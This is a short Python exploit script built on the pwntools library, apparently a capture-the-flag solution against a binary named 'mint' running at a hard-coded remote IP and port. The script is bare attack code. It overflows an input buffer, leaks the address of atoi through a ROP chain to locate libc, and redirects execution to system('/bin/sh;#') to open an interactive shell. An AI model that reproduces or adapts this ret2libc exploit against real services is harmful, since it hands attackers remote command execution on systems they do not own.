from pwn import *

libc = ELF("libc-2.23.so")

diff = libc.symbols['system'] - libc.symbols['atoi']

print "%x" % diff

#s = process("./mint")
s = remote("139.59.61.220", 42345)

s.recvuntil(":")
s.sendline("1")
s.sendline("A"*0x20)

s.sendline("2")
s.sendline("1")
s.sendline("B"*0x20)

s.recvuntil("ur op")
s.sendline("2")
s.sendline("1")
s.sendline("%s "+"A"*(19-3)+p32(0x80483F0)+p32(0x804862f)+p32(0x804a060)+p32(0x804a028))

s.recvuntil("ur op")
s.sendline("4")

s.recvuntil("option :")
ptr = s.recvuntil(" A")[:-2]

atoi_ptr = u32(ptr)

s.recvuntil(":")
s.sendline("1")
s.sendline("A"*0x20)

s.sendline("2")
s.sendline("1")
s.sendline("B"*0x20)

s.recvuntil("ur op")
s.sendline("2")
s.sendline("1")
libc.address = atoi_ptr - libc.symbols['atoi']
ptr = libc.symbols['system']
#ptr = 0x42424242
com = "/bin/sh;#"
s.sendline(com+"A"*(19-len(com))+p32(ptr)+"B"*4+p32(0x804a060))

s.recvuntil("ur op")
s.sendline("4")

s.interactive()

